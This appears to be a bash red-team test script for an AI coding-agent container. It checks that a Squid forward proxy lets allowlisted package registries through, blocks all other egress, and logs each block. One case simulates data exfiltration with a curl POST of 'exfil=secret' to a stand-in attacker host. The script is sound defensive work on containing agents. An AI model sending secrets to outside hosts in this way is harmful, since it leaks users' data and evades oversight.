#!/usr/bin/env bash
# Red-Team A11 — Forward-Proxy Allowlist/Egress.
# Implements docs/design/agentic-workflow/02-forward-proxy/04-testing.md.
#
# Tests the table cases from §1: allowed targets pass through, everything else is
# blocked (default-deny) AND is visible in access.log. Runs FROM the agent,
# i.e. via its http(s)_proxy -> forward-proxy:3128.
#
# Prerequisite: stack is running (`docker compose up -d`), agent is `claude-dev-env`.
# Run from host:   tests/redteam/test_egress.sh
set -u

SVC="${AGENT_SERVICE:-claude-dev-env}"
LOGFILE="${SQUID_ACCESS_LOG:-logs/squid/access.log}"
pass=0 fail=0

# curl in the agent container; uses its proxy env. -s silent, -S show errors, short timeouts.
agent_curl() { docker compose exec -T "$SVC" curl -sS -m 20 -o /dev/null -w '%{http_code}' "$@" 2>/dev/null; }

# check NAME EXPECT(allow|deny) curl-args...
check() {
  local name="$1" expect="$2"; shift 2
  local code; code="$(agent_curl "$@")"; local rc=$?
  local ok
  if [ "$expect" = "allow" ]; then
    # allowed = TCP/TLS came through and HTTP status is set (>=100), curl rc 0
    [ $rc -eq 0 ] && [ -n "$code" ] && [ "$code" -ge 100 ] 2>/dev/null && ok=1 || ok=0
  else
    # blocked = curl fails (proxy refused/terminated) OR 403/503 from the proxy
    { [ $rc -ne 0 ] || [ "$code" = "403" ] || [ "$code" = "503" ]; } && ok=1 || ok=0
  fi
  if [ "$ok" = 1 ]; then
    printf '  \033[32mPASS\033[0m  %-48s (rc=%s code=%s)\n' "$name" "$rc" "${code:-—}"; pass=$((pass+1))
  else
    printf '  \033[31mFAIL\033[0m  %-48s (rc=%s code=%s)\n' "$name" "$rc" "${code:-—}"; fail=$((fail+1))
  fi
}

echo "== Forward-Proxy Egress Tests (A11) =="

# --- Allowed targets (Allowlist) ---
check "HTTPS allowlisted (pypi)"        allow https://pypi.org/
check "HTTPS allowlisted (npm registry)" allow https://registry.npmjs.org/
check "HTTPS allowlisted (crates)"      allow https://static.crates.io/

# --- Blocked targets ---
check "HTTPS non-allowlisted (terminate)" deny  https://example.com/
check "HTTP  non-allowlisted (deny all)"   deny  http://example.com/
check "CONNECT non-safe-port (:22)"        deny  https://github.com:22/
check "IP-Literal (no dstdomain match)"    deny https://1.1.1.1/
check "Exfil-POST non-allowlisted"         deny  -X POST --data exfil=secret https://attacker.example.net/

# --- Proof: block appears in the audit log ---
echo "== Audit Log =="
if [ -f "$LOGFILE" ]; then
  if grep -Eq 'attacker\.example\.net|example\.com' "$LOGFILE"; then
    printf '  \033[32mPASS\033[0m  Block visible in access.log\n'; pass=$((pass+1))
  else
    printf '  \033[31mFAIL\033[0m  Block NOT in access.log (%s)\n' "$LOGFILE"; fail=$((fail+1))
  fi
else
  printf '  \033[33mSKIP\033[0m  %s not found (bind-mount?)\n' "$LOGFILE"
fi

echo "== Result: $pass passed, $fail failed =="
[ "$fail" -eq 0 ]
